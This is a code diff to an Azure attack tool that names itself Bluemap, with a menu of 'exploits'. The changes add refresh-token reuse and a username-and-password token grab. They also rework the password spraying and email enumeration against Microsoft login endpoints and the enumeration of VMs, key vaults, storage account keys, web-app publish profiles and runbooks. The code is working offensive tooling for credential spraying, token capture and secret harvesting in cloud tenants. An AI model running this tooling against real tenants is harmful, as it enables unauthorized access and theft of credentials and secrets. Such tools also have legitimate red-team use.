@@ -2,6 +2,7 @@ import base64
 import json, sys
 import uuid
 import os
+import uuid
 import random
 import string
 import http.client
@@ -14,6 +15,8 @@ import xml.dom.minidom
 import ssl, re
 
 Token = None
+RefreshToken = None
+AutoGenToken = False
 accessTokenGraph = None
 accessTokenVault = None
 storageAccessToken = None
@@ -65,6 +68,7 @@ def make_table(columns, data):
         rows.append(row)
     rows.append(end)
     return "\n".join([title,header, sep] + rows)
+
 def sendGETRequest(url, Token):
     object = {}
     o = urlparse(url)
@@ -137,7 +141,7 @@ def sendPOSTRequest(url, body, Token):
     return object
 
 
-def sendPOSTRequestSprayMSOL(url, user, pwd):
+def sendPOSTRequestSprayMSOL(url, user, pwd, resourceMgmt):
     object = {}
     o = urlparse(url)
     ctx = ssl.create_default_context()
@@ -149,7 +153,6 @@ def sendPOSTRequestSprayMSOL(url, user, pwd):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     data = {
-        'resource': 'https://graph.windows.net',
         'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
         'client_info': '1',
         'grant_type': 'password',
@@ -157,8 +160,38 @@ def sendPOSTRequestSprayMSOL(url, user, pwd):
         'password': pwd,
         'scope': 'openid'
     }
+    if resourceMgmt:
+        data['resource'] = 'https://management.azure.com/'
+    else:
+        data['resource'] = 'https://graph.windows.net'
     qs = urllib.parse.urlencode(data)
     conn.request("POST", str(o.path) + "/?" + str(o.query), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
+def sendPOSTRequestRefreshToken(tenantId, token):
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/"+str(tenantId)+"/oauth2/v2.0/token")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'grant_type': 'refresh_token',
+        'refresh_token': token,
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
     res = conn.getresponse()
     object["headers"] = dict(res.getheaders())
     object["status_code"] = int(res.status)
@@ -241,6 +274,10 @@ def setToken(token):
         Token = token
 
 
+def initRefreshToken(TokenRF):
+    global RefreshToken
+    RefreshToken = TokenRF
+
 def initToken(token, resetscopes):
     global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled,TargetSubscription, TargetTenantId
     if resetscopes:
@@ -268,7 +305,6 @@ def originitToken(token):
         global Token, hasMgmtAccess
         hasMgmtAccess = True
         Token = token
-
 
 def currentScope():
     global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
@@ -299,24 +335,8 @@ def currentProfile():
         else:
             print(strigify[1] + "\\" + strigify[0])
 
-def RD_ListAllVMs():
-    global Token
-    result = []
-    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
-    for sub in rs['json']['value']:
-        for res in getResGroup(sub['subscriptionId'])['value']:
-            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
-            for item in rsVM['json']['value']:
-                if 'identity' not in item:
-                    item['identity'] = "N/A"
-
-                item['subscriptionId'] = sub['subscriptionId']
-                item['resourceGroup'] = res['name']
-                result.append(item)
-    return result
-
 def ENUM_MSOLSpray(username,password):
-    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", username, password)
+    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", username, password, False)
     if r["status_code"] == 200:
         return True
     else:
@@ -340,6 +360,29 @@ def ENUM_MSOLSpray(username,password):
         else:
             return "Got unknown error"
 
+
+
+def ReloadToken():
+    global RefreshToken
+    r = sendPOSTRequestRefreshToken(parseTenantId(), RefreshToken )
+    response = r["json"]
+    if 'access_token' in response:
+        initToken(response['access_token'], True)
+        initRefreshToken(response['refresh_token'])
+
+'''
+ The method used to check token state and refresh if needed
+ TBD: Implement same logic for other methods as well
+'''     
+def CheckSubscriptionReqState():
+    global Token
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    if len(r['json']) == 0:
+        return r
+    else:
+        ReloadToken()
+        r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+        return r
 
 ''' Based on AADInternals Research (https://aadinternals.com/post/just-looking/) '''
 
@@ -450,35 +493,44 @@ def getArmTempPerResGroup(subid,resgroup):
 def RD_ListExposedWebApps():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
-            for item in rsVM['json']['value']:
-                if 'identity' not in item:
-                    item['identity'] = "N/A"
+            if len(rsVM['json']) == 0:
+                return result
+            else:
+                for item in rsVM['json']['value']:
+                    if 'identity' not in item:
+                        item['identity'] = "N/A"
 
-                item['subscriptionId'] = sub['subscriptionId']
-                item['resourceGroup'] = res['name']
-                result.append(item)
-    return result
+                    item['subscriptionId'] = sub['subscriptionId']
+                    item['resourceGroup'] = res['name']
+                    result.append(item)
+            return result
 
 def RD_ListAllDeployments():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     for sub in r['json']['value']:
         rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub["subscriptionId"]+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
-        for item in rsVM['json']['value']:
-            result.append(item)
-    return result
+        if len(rsVM['json']) == 0:
+            return result
+        else:
+            for item in rsVM['json']['value']:
+                result.append(item)
+        return result
 
 def RD_ListAllACRs():
     global Token
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
-    for sub in r['json']['value']:
-        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01", Token)
-        return rsub['json']
+    r = CheckSubscriptionReqState()
+    if len(r['json']) == 0:
+        return False
+    else:
+        for sub in r['json']['value']:
+            rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01", Token)
+            return rsub['json']
     return False
 
 def HLP_GetACRCreds(acrId):
@@ -566,23 +618,26 @@ def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
 def RD_ListAllVMs():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
-            for item in rsVM['json']['value']:
-                if 'identity' not in item:
-                    item['identity'] = "N/A"
+            if len(rsVM['json']) == 0:
+                return result
+            else:
+                for item in rsVM['json']['value']:
+                    if 'identity' not in item:
+                        item['identity'] = "N/A"
 
-                item['subscriptionId'] = sub['subscriptionId']
-                item['resourceGroup'] = res['name']
-                result.append(item)
-    return result
+                    item['subscriptionId'] = sub['subscriptionId']
+                    item['resourceGroup'] = res['name']
+                    result.append(item)
+            return result
 
 def RD_ListAllVaults():
     global Token
     result = []
-    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    rs = CheckSubscriptionReqState()
     for sub in rs['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01", Token)
@@ -591,6 +646,7 @@ def RD_ListAllVaults():
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
+
 def RD_ListAllStorageAccountsKeys(AccId):
     global Token
     r = sendPOSTRequest("https://management.azure.com/"+AccId+"/listKeys?api-version=2022-05-01", None, Token)
@@ -599,27 +655,31 @@ def RD_ListAllStorageAccountsKeys(AccId):
 def RD_ListAllStorageAccounts():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     for sub in r['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", Token)
-            for item in rsVM['json']['value']:
+            if len(rsVM['json']) == 0:
+                return result
+            else:
+                for item in rsVM['json']['value']:
 
-                item['subscriptionId'] = sub['subscriptionId']
-                item['resourceGroup'] = res['name']
+                    item['subscriptionId'] = sub['subscriptionId']
+                    item['resourceGroup'] = res['name']
 
-                if 'allowSharedKeyAccess' not in item['properties']:
-                    item['allowSharedKeyAccess'] = "N/A"
-                else:
-                    item['allowSharedKeyAccess'] = item['properties']['allowSharedKeyAccess']
+                    if 'allowSharedKeyAccess' not in item['properties']:
+                        item['allowSharedKeyAccess'] = "N/A"
+                    else:
+                        item['allowSharedKeyAccess'] = item['properties']['allowSharedKeyAccess']
 
-                if 'customDomain' not in item['properties']:
-                    item['customDomain'] = "N/A"
-                else:
-                    item['customDomain'] = item['properties']['customDomain']
+                    if 'customDomain' not in item['properties']:
+                        item['customDomain'] = "N/A"
+                    else:
+                        item['customDomain'] = item['properties']['customDomain']
 
-                result.append(item)
-    return result
+                    result.append(item)
+            return result
+
 def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
     global Token
     req = {
@@ -638,7 +698,6 @@ def CON_GetPublishProfileBySite(SiteId):
     rs = sendPOSTRequest("https://management.azure.com/"+SiteId+"/publishxml?api-version=2022-03-01", None, Token)
     rsConf = sendGETRequest("https://management.azure.com/"+SiteId+"/config/web?api-version=2022-03-01", Token)
     if rs["status_code"] == 200:
-        print(rs["response"])
         DOMTree = xml.dom.minidom.parseString(rs["response"])
         xmlContent = DOMTree.documentElement
         profiles = xmlContent.getElementsByTagName('publishProfile')
@@ -733,32 +792,38 @@ def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName,
 def RD_ListAutomationAccounts():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
-    for sub in r['json']['value']:
-        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
-        for item in rsub['json']['value']:
-            item['subscriptionId'] = sub['subscriptionId']
-            result.append(item)
-    return result
+    r = CheckSubscriptionReqState()
+    if len(r['json']) == 0:
+        return result
+    else:
+        for sub in r['json']['value']:
+            rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
+            for item in rsub['json']['value']:
+                item['subscriptionId'] = sub['subscriptionId']
+                result.append(item)
+        return result
 
 def RD_ListRunBooksByAutomationAccounts():
     global Token
     result = []
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     for sub in r['json']['value']:
         pathToAutomationAccount = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
-        for automationAccount in pathToAutomationAccount['json']['value']:
-            GetRunBook = sendGETRequest("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01", Token)
-            for item in GetRunBook['json']['value']:
-                item['subscriptionId'] = str(sub['subscriptionId'])
-                item['automationAccount'] = str(automationAccount['name'])
-                result.append(item)
-    return result
+        if len(pathToAutomationAccount['json']) == 0:
+            return result
+        else:
+            for automationAccount in pathToAutomationAccount['json']['value']:
+                GetRunBook = sendGETRequest("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01", Token)
+                for item in GetRunBook['json']['value']:
+                    item['subscriptionId'] = str(sub['subscriptionId'])
+                    item['automationAccount'] = str(automationAccount['name'])
+                    result.append(item)
+        return result
 
 def RD_ListARMTemplates():
     global Token
     finalResult = []
-    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    rs = CheckSubscriptionReqState()
     for sub in rs['json']['value']:
         for res in getResGroup(sub['subscriptionId'])['value']:
             for template in getArmTempPerResGroup(sub['subscriptionId'], res['name'])['value']:
@@ -774,6 +839,7 @@ def RD_ListARMTemplates():
                     continue
                 finalResult.append(currentdata)
     return finalResult
+    
 def CHK_AppRegOwner(appId):
     global accessTokenGraph
     r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
@@ -828,13 +894,13 @@ def tryGetToken():
                 vaultToken = json.loads(vault.stdout)
                 accessTokenVault = vaultToken['accessToken']
                 hasVaultEnabled = True
-            hasGraphAccess = True
-            hasMgmtAccess = True
-            print("Captured token done. All set!")
-            jres = json.loads(add.stdout)
-            jresgraph = json.loads(graph.stdout)
-            accessToken = jres['accessToken']
-            accessTokenGraph = jresgraph['accessToken']
+                hasGraphAccess = True
+                hasMgmtAccess = True
+                print("Captured token done. All set!")
+                jres = json.loads(add.stdout)
+                jresgraph = json.loads(graph.stdout)
+                accessToken = jres['accessToken']
+                accessTokenGraph = jresgraph['accessToken']
         return accessToken
     except KeyError:
         return False
@@ -995,6 +1061,7 @@ def shadownAccounts():
                 allPermRolesAssignsRecordsCount += 1
     print(make_table(field_names2, rows2))
     print("Completed.")
+
 def AutoRecon():
     print("\nChecking for current SubscriptionId: " + str(TargetSubscription))
     print("\n===== Checking Available Resources =====\n")
@@ -1019,7 +1086,9 @@ def AutoRecon():
 
     print("Logged as: ")
     currentProfile()
+    print("User Id: " + parseUPNObjectId())
     currentScope()
+    
 
     print("\n===== Checking all attached subscriptions =====\n")
 
@@ -1041,9 +1110,12 @@ def AutoRecon():
 
     print("\n===== Checking Current Subscription Permissions =====\n")
 
-    print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
-    allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
+    print("Checking all RolePermissions & RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...\n")
+
+    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+    token = urllib.parse.quote("assignedTo('"+str(parseUPNObjectId())+"')")
+    allRolesAssigns = GetAllRoleAssignmentsForSubscriptionFilterd(str(TargetSubscription),token)
+    field_names = ["#", "RoleName", "Can Abused?", "Details"]
     rows = []
     allRolesAssignsRecordsCount = 0
     for role in range(0, len(allRolesAssigns)):
@@ -1056,7 +1128,6 @@ def AutoRecon():
             rows.append(
                 {"#": allRolesAssignsRecordsCount,
                  "RoleName": currentRoleName,
-                 "Scope": currentRoleScope,
                  "Can Abused?": "Yes",
                  "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
             )
@@ -1064,43 +1135,41 @@ def AutoRecon():
             rows.append(
                 {"#": allRolesAssignsRecordsCount,
                  "RoleName": currentRoleName,
-                 "Scope": currentRoleScope,
                  "Can Abused?": "No",
                  "Details": "N/A"}
             )
         allRolesAssignsRecordsCount += 1
-    print(make_table(field_names, rows))
-    print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
-    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
-    field_names2 = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
-    rows2 = []
-    allPermRolesAssignsRecordsCount = 0
+    
     for rolePermission in range(0, len(allPermRolesAssigns)):
         resultAllRolesAssigns = allPermRolesAssigns
         currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
             resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
-        currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
-        currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
-        for permission in currentRolePermissions:
-            if canPermissionBeAbused(permission) is not False:
-                rows2.append(
-                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
-                     "Permission Assigned": permission, "Can Abused?": "Yes",
-                     "Details": canPermissionBeAbused(permission).split("|")[1]}
-                )
-            else:
-                rows2.append(
-                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
-                     "Permission Assigned": permission, "Can Abused?": "No",
-                     "Details": "N/A"}
-                )
-            allPermRolesAssignsRecordsCount += 1
-    print(make_table(field_names2, rows2))
+        if len(currentRolePermissionInformation) == 0:
+            continue
+        else:
+            currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
+            currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
+            for permission in currentRolePermissions:
+                if canPermissionBeAbused(permission) is not False:
+                    rows.append(
+                        {"#": allRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                        "Permission Assigned": permission, "Can Abused?": "Yes",
+                        "Details": canPermissionBeAbused(permission).split("|")[1]}
+                    )
+                else:
+                    rows.append(
+                        {"#": allRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
+                        "Permission Assigned": permission, "Can Abused?": "No",
+                        "Details": "N/A"}
+                    )
+                allRolesAssignsRecordsCount += 1
+
+    print(make_table(field_names, rows))
 
 
 def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
     global Token
-    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
+    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", Token)
     return r['json']
 
 def GetAllRoleAssignmentsForSubscriptionFilterd(subscriptionId, filter):
@@ -1150,7 +1219,7 @@ def getToken():
 
 def ListSubscriptionsForToken():
     global Token
-    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
+    r = CheckSubscriptionReqState()
     return r['json']
 
 
@@ -1177,6 +1246,7 @@ def attackWindow():
     print(banner)
     '''
     supportedCommands = [
+        "version",
         "whoami",
         "scopes",
         "get_subs",
@@ -1200,8 +1270,10 @@ def attackWindow():
         "back"
     ]
     exploits = [
+        "Token/AuthToken",
         "Token/GenToken",
         "Token/SetToken",
+        "Token/RefreshToken",
         "External/OSINT",
         "External/EmailEnum",
         "External/PasswordSpray",
@@ -1245,6 +1317,8 @@ def attackWindow():
         else:
             if mode == "run" and ExploitChoosen is None:
                 print("Use run command only within an exploit.")
+            elif mode == "version":
+                print("Bluemap 1.0.0-Beta")
             elif mode == "whoami":
                 currentProfile()
             elif mode == "scopes":
@@ -1363,9 +1437,8 @@ def attackWindow():
                     rows = []
                     allRolesAssignsRecordsCount = 0
                     for role in range(0, len(allRolesAssigns)):
-                        resultAllRolesAssigns = allRolesAssigns
-                        currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
-                        currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
+                        currentRoleInformation = GetAllRoleDefinitionsUnderId(allRolesAssigns['value'][role]['properties']['roleDefinitionId'])
+                        currentRoleScope = allRolesAssigns['value'][role]['properties']['scope']
                         currentRoleName = currentRoleInformation['properties']['roleName']
                         if canRoleBeAbused(currentRoleName) is not False:
                             rows.append(
@@ -1390,7 +1463,8 @@ def attackWindow():
                     print("Use set_target to set a subscription to work on.")
                 else:
                     print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
-                    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
+                    token = urllib.parse.quote("assignedTo('"+str(parseUPNObjectId())+"')")
+                    allPermRolesAssigns = GetAllRoleAssignmentsForSubscriptionFilterd(TargetSubscription, token)
                     field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                     rows = []
                     allPermRolesAssignsRecordsCount = 0
@@ -1474,6 +1548,7 @@ def attackWindow():
                 setToken("")
             elif "Token/GenToken" in ExploitChoosen and mode == "run":
                 print("Trying getting token automatically for you...")
+                AutoGenToken = True
                 token = tryGetToken()
                 if token:
                     initToken(token, False)
@@ -1482,6 +1557,17 @@ def attackWindow():
                 token = input("Enter Token:")
                 initToken(token, True)
                 print("All set.")
+            elif "Token/RefreshToken" in ExploitChoosen and mode == "run":
+                ''' For Token/GenToken method '''
+                if AutoGenToken == True:
+                    token = tryGetToken()
+                    if token:
+                        initToken(token, False)
+                        print("Token Refresh. Done.")
+                else:
+                    ''' For any other manual method (Token/SetToken or Token/AuthToken)'''
+                    ReloadToken()
+                    print("Token Refresh. Done.")
             elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all external-facing Azure Service Apps..")
                 if len(RD_ListExposedWebApps()) < 1:
@@ -1704,6 +1790,17 @@ def attackWindow():
                     print("Found " + str(subRecordCount) + " total valid domains:")
                     print(make_table(field_names, rows))
                     print("Operation Completed.")
+            elif "Token/AuthToken" in ExploitChoosen and mode == "run":
+                user = input("Enter Username: ")
+                pwd = input("Enter Password: ")
+                r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", user, pwd, True)
+                response = r["json"]
+                if 'access_token' in response:
+                    initToken(response['access_token'], True)
+                    initRefreshToken(response['refresh_token'])
+                    print("Logged In!")
+                else:
+                    print("Invalid username / password")
             elif "External/EmailEnum" in ExploitChoosen and mode == "run":
                 DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
                 if DestPath == "":
@@ -1726,7 +1823,7 @@ def attackWindow():
                             elif int(technique) == 2:
                                 for target in open(os.path.normpath(DestPath), 'r').readlines():
                                     ' based on MSOLSpray method by @dafthack '
-                                    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456")
+                                    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456", False)
                                     error = r["response"]
                                     if "AADSTS50034" in error:
                                         print("The email " + target.strip() + " not found")
@@ -1755,9 +1852,7 @@ def attackWindow():
                                 if chk is True:
                                     print("Found valid account: " + target.strip() + " / " + Password + "")
                                 else:
-                                    if 'Invalid password.' in chk:
-                                        continue
-                                    print(chk)
+                                    continue
                             print("Completed Operation.")
                         except FileNotFoundError:
                             print("Unable to locate file, please check your path.")
@@ -2134,41 +2229,7 @@ def attackWindow():
             else:
                 print("unkown command.")
 
-attackWindow()
-
-'''
-def statupWindow(isFromMenu):
-    if isFromMenu:
-        print("You're out of attack mode.")
-        isFromMenu = False
-    while (True):
-        attackWindow()
-
-       
-        opt = input(">> ")
-        if opt == "1":
-            print("Trying getting token automaticlly for you...")
-            initToken(tryGetToken())
-        elif opt == "2":
-            print("Please paste your Azure token here:")
-            token = input("Enter Token:")
-            initToken(token)
-            print("All set.")
-        elif opt == "3":
-            print("Display Current token:")
-            print(getToken())
-        elif opt == "4":
-            print("Resetting token..")
-            setToken("")
-        elif opt == "5":
-            print("Getting into attack mode.. use command help for navigate")
-            attackWindow()
-        elif opt == "6":
-            AboutWindow()
-        elif opt == "whoami":
-            currentProfile()
-        elif opt == "scopes":
-            currentScope()
-        else:
-            displayMenu(True)
-'''
+try:
+    attackWindow()
+except KeyboardInterrupt:
+    print("\nBye..Bye..!")
